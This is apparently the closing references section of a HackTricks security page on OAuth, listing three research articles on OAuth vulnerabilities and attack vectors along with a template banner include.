- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
